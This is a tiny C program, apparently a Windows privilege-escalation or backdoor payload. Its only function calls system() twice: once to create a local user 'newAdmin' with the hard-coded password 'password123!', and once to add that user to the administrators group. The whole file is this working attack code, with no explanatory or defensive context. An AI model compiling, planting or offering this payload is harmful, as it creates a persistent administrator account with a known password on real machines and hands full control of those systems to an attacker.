#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user newAdmin password123! /add");
  i = system ("net localgroup administrators newAdmin /add");
  
  return 0;
}
